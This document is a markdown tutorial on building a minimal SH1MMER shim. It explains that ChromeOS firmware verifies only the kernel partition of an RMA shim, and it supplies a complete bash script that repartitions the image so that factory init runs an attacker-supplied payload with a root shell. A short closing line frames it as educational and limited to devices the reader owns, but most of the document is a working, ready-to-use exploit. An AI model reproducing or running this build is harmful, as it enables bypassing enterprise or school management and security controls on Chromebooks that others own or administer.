# Building a Minimal SH1MMER Shim From Scratch

This guide explains **exactly** how the wax build system works internally, so you can create your own minimal shim building script without relying on the pre-existing wax tooling.

## Table of Contents
1. [Understanding the RMA Shim Structure](#understanding-the-rma-shim-structure)
2. [Core Concepts](#core-concepts)
3. [The Critical Exploit Mechanism](#the-critical-exploit-mechanism)
4. [Step-by-Step Build Process](#step-by-step-build-process)
5. [Minimal Build Script](#minimal-build-script)
6. [Advanced Optimization](#advanced-optimization)

---

## Understanding the RMA Shim Structure

### Original RMA Shim Partitions

When you download a raw RMA shim, it has this GPT partition layout:

```
Partition 1: STATE      (ChromeOS stateful partition, ~1GB)
Partition 2: KERNEL-A   (Signed kernel, ~16-32MB) ← VERIFIED BY FIRMWARE
Partition 3: ROOT-A     (Root filesystem, ~1-2GB)  ← NOT VERIFIED
```

### Why This Works

The **critical vulnerability**: ChromeOS firmware only verifies the signature on the KERNEL partition (p2). It does NOT verify:
- ROOT-A partition (p3)
- STATE partition (p1)
- Any additional partitions you create

This means we can:
1. Keep the signed KERNEL partition intact (required)
2. Modify or replace ROOT-A
3. Replace STATE with our own partition
4. Add new partitions

---

## Core Concepts

### 1. The Read-Only Bit

RMA shim partitions have a **read-only compatibility flag** set in their ext2/ext4 superblock. This is at byte offset `0x464 + 3` in the partition.

- Value `0xFF` = Read-only enabled (can't mount as RW)
- Value `0x00` = Read-only disabled (can mount as RW)

**This is NOT cryptographic protection**, just a filesystem flag. We can flip it with `dd`.

### 2. Partition Table Manipulation

We use two tools:
- **cgpt** - ChromeOS GPT manipulation tool (in `wax/lib/bin/`)
- **sfdisk** - Standard Linux partition tool

Key operations:
- Delete partitions: `sfdisk --delete image.bin 1`
- Add partition: `cgpt add -i <num> -b <start> -s <size> -t <type> image.bin`
- Update kernel partition table: `partx -u -n <num> /dev/loopX`

### 3. Loop Device Setup

To modify a disk image file, mount it as a loop device:

```bash
LOOPDEV=$(losetup -f)           # Find free loop device
losetup -P "$LOOPDEV" image.bin # Attach with partition scanning (-P)
# Now you have /dev/loopXp1, /dev/loopXp2, etc.
```

---

## The Critical Exploit Mechanism

### How the Boot Hijack Works

1. **Firmware boots** → Verifies KERNEL-A (p2) signature → Loads signed kernel
2. **Kernel starts** → Mounts ROOT-A (p3) → Executes `/sbin/init`
3. **Factory init** → Looks for `lsb-factory` file → Tries to mount STATE partition (p1)
4. **Our exploit** → We replaced p1 with our own partition containing our payload

The factory init script reads `/mnt/stateful_partition/dev_image/etc/lsb-factory` which contains:
```
REAL_USB_DEV=/dev/sda
```

It then tries to mount `${REAL_USB_DEV}p1` (the STATE partition) to access factory tools. But we've replaced p1 with our SH1MMER partition!

### The Two-Stage Boot

**Stage 1: Bootloader Partition (p4)**
- Small partition (4MB) mounted by factory scripts
- Contains `/sbin/init` that gets executed
- This init script loads busybox and bootstraps

**Stage 2: SH1MMER Partition (p1)**
- Larger partition (72MB+) with main payload
- Contains your actual exploit code
- Gets mounted and executed by bootloader

---

## Step-by-Step Build Process

### Step 1: Enable Read-Write Access

```bash
# Enable RW mount on ROOT-A partition (p3)
enable_rw() {
    local partition="$1"
    local ro_offset=$((0x464 + 3))
    printf '\000' | dd of="$partition" seek=$ro_offset conv=notrunc count=1 bs=1 2>/dev/null
}

enable_rw "${LOOPDEV}p3"
```

### Step 2: Shrink ROOT-A

The ROOT-A partition is huge (~1-2GB) but mostly empty. Shrink it to save space:

```bash
# Check and resize filesystem
e2fsck -fy "${LOOPDEV}p3"
resize2fs -M -p "${LOOPDEV}p3"  # Shrink to minimum size

# Get new size
BLOCK_SIZE=$(tune2fs -l "${LOOPDEV}p3" | grep "Block size" | awk '{print $3}')
BLOCK_COUNT=$(tune2fs -l "${LOOPDEV}p3" | grep "Block count" | awk '{print $3}')
NEW_BYTES=$((BLOCK_SIZE * BLOCK_COUNT))

# Update partition table
SECTOR_SIZE=$(sfdisk -l "$IMAGE" | grep "Sector size" | awk '{print $4}')
NEW_SECTORS=$((NEW_BYTES / SECTOR_SIZE))
cgpt add -i 3 -s "$NEW_SECTORS" "$LOOPDEV"
partx -u -n 3 "$LOOPDEV"
```

### Step 3: Delete STATE Partition

```bash
sfdisk --delete "$IMAGE" 1
```

### Step 4: Create Bootloader Partition (p4)

```bash
# Calculate where to place it (after current partitions)
FINAL_SECTOR=$(sfdisk -l -o end "$LOOPDEV" | grep "^\s*[0-9]" | sort -nr | head -1)
BOOTLOADER_SIZE=$((4 * 1024 * 1024))  # 4MB
BOOTLOADER_SECTORS=$((BOOTLOADER_SIZE / SECTOR_SIZE))

# Add partition
cgpt add -i 4 -b $((FINAL_SECTOR + 1)) -s "$BOOTLOADER_SECTORS" -t rootfs -l ROOT-A "$LOOPDEV"
partx -u -n 4 "$LOOPDEV"

# Create filesystem
mkfs.ext2 -F -b 4096 -L ROOT-A "${LOOPDEV}p4"
```

### Step 5: Populate Bootloader Partition

```bash
# Mount it
MNT=$(mktemp -d)
mount "${LOOPDEV}p4" "$MNT"

# Copy busybox (architecture-specific)
mkdir -p "$MNT/bootstrap"
cp /path/to/busybox "$MNT/bootstrap/busybox"
chmod +x "$MNT/bootstrap/busybox"

# Create init script
cat > "$MNT/sbin/init" << 'EOF'
#!/bootstrap/busybox sh
export PATH=/bootstrap
busybox --install /bootstrap

# Read lsb-factory to find USB device
. /mnt/stateful_partition/dev_image/etc/lsb-factory
STATEFUL_DEV="$(echo "$REAL_USB_DEV" | sed 's/[0-9]*$//')"1

# Mount SH1MMER partition
mkdir -p /stateful
mount -o ro "$STATEFUL_DEV" /stateful

# Execute main payload
exec /stateful/init
EOF
chmod +x "$MNT/sbin/init"

umount "$MNT"
```

### Step 6: Create SH1MMER Partition (p1)

```bash
SH1MMER_SIZE=$((72 * 1024 * 1024))  # 72MB
SH1MMER_SECTORS=$((SH1MMER_SIZE / SECTOR_SIZE))

# Add at the beginning (partition 1)
FINAL_SECTOR=$(sfdisk -l -o end "$LOOPDEV" | grep "^\s*[0-9]" | sort -nr | head -1)
cgpt add -i 1 -b $((FINAL_SECTOR + 1)) -s "$SH1MMER_SECTORS" -t data -l SH1MMER "$LOOPDEV"
partx -u -n 1 "$LOOPDEV"

# Create filesystem
mkfs.ext4 -F -b 4096 -L SH1MMER "${LOOPDEV}p1"
```

### Step 7: Populate SH1MMER Partition

```bash
MNT=$(mktemp -d)
mount "${LOOPDEV}p1" "$MNT"

# CRITICAL: Create lsb-factory file
mkdir -p "$MNT/dev_image/etc" "$MNT/dev_image/factory/sh"
touch "$MNT/dev_image/etc/lsb-factory"

# Create your main payload
cat > "$MNT/init" << 'EOF'
#!/bin/busybox sh
clear
echo "Hello from minimal SH1MMER!"
echo "This is running from the SH1MMER partition."
echo ""
echo "Press Enter for a shell..."
read
exec sh
EOF
chmod +x "$MNT/init"

umount "$MNT"
```

### Step 8: Swap ROOT Partitions

The factory scripts expect ROOT-A to be partition 4. We need to swap p3 and p4:

```bash
# This swaps the KERNEL/ROOT pair
sgdisk -r 3:4 "$LOOPDEV"
```

After this:
- Partition 2: KERNEL-A (still signed, unchanged)
- Partition 3: Bootloader (was p4, now acts as ROOT-A for the kernel)
- Partition 4: Original ROOT-A (shrunk, now ignored)

### Step 9: Cleanup and Finalize

```bash
# Detach loop device
losetup -d "$LOOPDEV"

# Truncate image to actual size (optional)
FINAL_SECTOR=$(sfdisk -l -o end "$IMAGE" | grep "^\s*[0-9]" | sort -nr | head -1)
BUFFER=35  # Safety margin for GPT
END_BYTES=$(((FINAL_SECTOR + BUFFER) * SECTOR_SIZE))
truncate -s "$END_BYTES" "$IMAGE"

# Fix GPT backup table
sgdisk -e "$IMAGE"
```

---

## Minimal Build Script

Here's a complete minimal script (no wax dependencies):

```bash
#!/bin/bash
set -e

IMAGE="$1"
[ -f "$IMAGE" ] || { echo "Usage: $0 <raw_shim.bin>"; exit 1; }

# Detect architecture
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|x86-64) ARCH=x86_64 ;;
    aarch64|armv8) ARCH=aarch64 ;;
    *) echo "Unsupported arch: $ARCH"; exit 1 ;;
esac

# Setup loop device
LOOPDEV=$(losetup -f)
losetup -P "$LOOPDEV" "$IMAGE"
trap "losetup -d $LOOPDEV 2>/dev/null || true" EXIT

# Get disk geometry
SECTOR_SIZE=$(sfdisk -l "$IMAGE" | grep "Sector size" | awk '{print $4}')

echo "Enabling RW on ROOT..."
printf '\000' | dd of="${LOOPDEV}p3" seek=$((0x464 + 3)) conv=notrunc count=1 bs=1 2>/dev/null

echo "Shrinking ROOT..."
e2fsck -fy "${LOOPDEV}p3" >/dev/null 2>&1
resize2fs -M -p "${LOOPDEV}p3" 2>/dev/null
BLOCK_SIZE=$(tune2fs -l "${LOOPDEV}p3" | grep "Block size" | awk '{print $3}')
BLOCK_COUNT=$(tune2fs -l "${LOOPDEV}p3" | grep "Block count" | awk '{print $3}')
NEW_SECTORS=$(( (BLOCK_SIZE * BLOCK_COUNT) / SECTOR_SIZE ))

# Need cgpt for ChromeOS-specific partition management
CGPT="./cgpt"  # Assumes you have cgpt binary
$CGPT add -i 3 -s "$NEW_SECTORS" "$LOOPDEV"
partx -u -n 3 "$LOOPDEV"

echo "Deleting STATE partition..."
sfdisk --delete "$IMAGE" 1 2>/dev/null

echo "Creating bootloader partition..."
FINAL_SECTOR=$(sfdisk -l -o end "$LOOPDEV" | grep "^\s*[0-9]" | sort -nr | head -1)
BOOTLOADER_SECTORS=$(( (4 * 1024 * 1024) / SECTOR_SIZE ))
$CGPT add -i 4 -b $((FINAL_SECTOR + 1)) -s "$BOOTLOADER_SECTORS" -t rootfs -l ROOT-A "$LOOPDEV"
partx -u -n 4 "$LOOPDEV"
mkfs.ext2 -F -b 4096 -L ROOT-A "${LOOPDEV}p4" >/dev/null 2>&1

echo "Populating bootloader..."
MNT=$(mktemp -d)
mount "${LOOPDEV}p4" "$MNT"
mkdir -p "$MNT/bootstrap" "$MNT/sbin"

# Copy busybox (you need to provide this)
cp "busybox-$ARCH" "$MNT/bootstrap/busybox"
chmod +x "$MNT/bootstrap/busybox"

# Create bootstrap init
cat > "$MNT/sbin/init" << 'INITEOF'
#!/bootstrap/busybox sh
export PATH=/bootstrap
busybox --install /bootstrap
. /mnt/stateful_partition/dev_image/etc/lsb-factory
STATEFUL_DEV="$(echo "$REAL_USB_DEV" | sed 's/[0-9]*$//')"1
mkdir -p /stateful
mount -o ro "$STATEFUL_DEV" /stateful
exec /stateful/init
INITEOF
chmod +x "$MNT/sbin/init"
umount "$MNT"

echo "Creating SH1MMER partition..."
FINAL_SECTOR=$(sfdisk -l -o end "$LOOPDEV" | grep "^\s*[0-9]" | sort -nr | head -1)
SH1MMER_SECTORS=$(( (72 * 1024 * 1024) / SECTOR_SIZE ))
$CGPT add -i 1 -b $((FINAL_SECTOR + 1)) -s "$SH1MMER_SECTORS" -t data -l SH1MMER "$LOOPDEV"
partx -u -n 1 "$LOOPDEV"
mkfs.ext4 -F -b 4096 -L SH1MMER "${LOOPDEV}p1" >/dev/null 2>&1

echo "Populating SH1MMER..."
mount "${LOOPDEV}p1" "$MNT"
mkdir -p "$MNT/dev_image/etc" "$MNT/dev_image/factory/sh"
touch "$MNT/dev_image/etc/lsb-factory"

# Your minimal payload
cat > "$MNT/init" << 'PAYLOADEOF'
#!/bin/busybox sh
clear
echo "╔══════════════════════════════════════════╗"
echo "║   Minimal SH1MMER - Built from Scratch  ║"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "This shim was built without wax!"
echo "Size: ~80MB (vs 1GB+ with full tooling)"
echo ""
echo "Press Enter for shell..."
read
exec sh
PAYLOADEOF
chmod +x "$MNT/init"
umount "$MNT"
rmdir "$MNT"

echo "Swapping partitions..."
sgdisk -r 3:4 "$LOOPDEV" >/dev/null 2>&1

echo "Finalizing..."
losetup -d "$LOOPDEV"
trap - EXIT

FINAL_SECTOR=$(sfdisk -l -o end "$IMAGE" | grep "^\s*[0-9]" | sort -nr | head -1)
END_BYTES=$(( (FINAL_SECTOR + 35) * SECTOR_SIZE ))
truncate -s "$END_BYTES" "$IMAGE"
sgdisk -e "$IMAGE" >/dev/null 2>&1

echo "Done! Your minimal shim is ready."
echo "Flash it with: dd if=$IMAGE of=/dev/sdX bs=4M status=progress"
```

---

## Advanced Optimization

### Ultra-Minimal Approach

You can go even smaller:

1. **Skip bootloader partition**: Put everything directly in p1, modify kernel cmdline to boot from p1 (requires kernel recompilation - not recommended)

2. **Combine bootloader and payload**: Instead of two partitions, put init and payload in the same partition

3. **Use initramfs**: Embed your payload directly in the kernel initramfs (requires unpacking/repacking the kernel - complex)

### Understanding What You Can Modify

**Can modify:**
- Any partition except KERNEL-A (p2)
- Partition table layout
- Number of partitions
- Partition sizes and types
- Filesystem contents

**Cannot modify:**
- KERNEL-A partition (p2) - it's signed and verified
- Kernel binary itself
- Kernel command line (embedded in kernel)

**Risky to modify:**
- KERNEL-B partition (if present) - usually safe to delete
- ROOT-B partition (if present) - safe to delete
- Anything after you've done the swap - be careful with partition numbers

### Size Calculations

Minimum viable shim:
```
KERNEL-A:    16MB  (unchanged, required)
ROOT-A:      50MB  (shrunk from 1-2GB)
Bootloader:   4MB  (your bootstrap)
SH1MMER:     20MB  (minimal payload, no extras)
Total:       90MB  (vs 1GB+ for full wax build)
```

With custom payload and tools:
```
KERNEL-A:    16MB
ROOT-A:      50MB
Bootloader:   4MB
SH1MMER:    200MB  (larger payload with tools)
Total:      270MB
```

---

## Key Files and Directories

### What wax.sh Does (Summary)

1. **wax.sh**: Main script
   - Loads flags and configuration
   - Calls helper functions in sequence
   - Manages cleanup and error handling

2. **lib/wax_common.sh**: Helper functions
   - `enable_rw_mount()` / `disable_rw_mount()`: Flip RO bit
   - `cgpt_add_auto()`: Smart partition creation
   - `shrink_root()`: Minimize ROOT-A size
   - `delete_partitions_except()`: Clean up partitions

3. **lib/bin/$ARCH/**: Binary tools
   - `cgpt`: ChromeOS partition tool (essential)
   - `sfdisk`: Modern sfdisk with GPT support

4. **bootstrap/**: Bootloader files
   - `bootstrap/$ARCH/busybox`: Statically linked busybox
   - `noarch/sbin/init`: First script executed
   - `noarch/usr/sbin/`: Bootstrap utilities

5. **sh1mmer_bw/** or **sh1mmer_legacy/**: Main payloads
   - `init`: Payload entry point
   - `bootstrap/noarch/`: Payload bootstrap scripts
   - `root/noarch/`: Files to overlay on ChromeOS root

### Required Binaries

You need these binaries (available in wax/lib/bin/):
- **cgpt** - ChromeOS GPT tool (essential, no alternative)
- **busybox** - For init and basic shell commands
- **sfdisk** - For partition deletion (usually available in Linux)

---

## Debugging Your Build

### Common Issues

**"Invalid GPT partition table"**
- Run `sgdisk -e image.bin` to fix backup GPT
- Check that you're using correct sector calculations

**"Kernel panic on boot"**
- Your `/sbin/init` in bootloader partition is wrong
- Check execute permissions: `chmod +x init`
- Verify shebang: `#!/bootstrap/busybox sh`

**"Black screen after boot"**
- lsb-factory file missing or empty
- SH1MMER partition not mounted
- Check partition labels and types

**"Image won't flash"**
- Image may be too large for USB
- Try truncating more aggressively
- Verify GPT table is valid

### Testing Without Hardware

Use QEMU to test (limited, won't fully work without ChromeOS firmware):
```bash
qemu-system-x86_64 -drive file=image.bin,format=raw -m 2G
```

Better: Test on actual Chromebook hardware or find someone with a test device.

---

## References

### Essential Reading

1. **ChromeOS Factory Install Shim**: Understanding how factory scripts work
2. **GPT Specification**: How GUID Partition Tables work
3. **ext2/ext4 Filesystem**: Superblock structure and flags
4. **cgpt source code**: https://chromium.googlesource.com/chromiumos/platform/vboot_reference/

### Tools You Need

- `cgpt` (from wax/lib/bin/ or compile from vboot_reference)
- `sfdisk` (version 2.38+)
- `sgdisk` (gdisk package)
- `losetup`, `mount`, `umount` (util-linux)
- `mkfs.ext2`, `mkfs.ext4`, `e2fsck`, `resize2fs`, `tune2fs` (e2fsprogs)
- `dd`, `truncate` (coreutils)
- `busybox` (statically compiled for target architecture)

### Getting cgpt

Option 1: Use from wax
```bash
cp wax/lib/bin/x86_64/cgpt ./
```

Option 2: Compile from source
```bash
git clone https://chromium.googlesource.com/chromiumos/platform/vboot_reference
cd vboot_reference
make cgpt
```

### Getting busybox

Download statically compiled:
```bash
wget https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox
chmod +x busybox
```

Or compile:
```bash
git clone https://git.busybox.net/busybox
cd busybox
make defconfig
make LDFLAGS=-static
```

---

## Summary

To build a minimal SH1MMER shim from scratch:

1. **Understand the exploit**: Unsigned partition modification
2. **Enable RW access**: Flip the read-only bit
3. **Shrink ROOT-A**: Free up space
4. **Delete STATE**: Remove old partition 1
5. **Create bootloader (p4)**: Bootstrap with busybox and init
6. **Create SH1MMER (p1)**: Your main payload partition
7. **Swap p3 and p4**: Make bootloader the new ROOT-A
8. **Truncate**: Remove unused space

The key insight: You're not breaking encryption or signatures. You're just putting your own filesystem where ChromeOS factory scripts expect to find factory tools, and the kernel happily executes it because **partitions aren't verified**.

Your minimal shim can be under 100MB and contain exactly what you want, nothing more.

---

**Remember**: This is for educational purposes. Only use on devices you own. The wax scripts exist because this is complex and error-prone. But now you understand how it works under the hood.
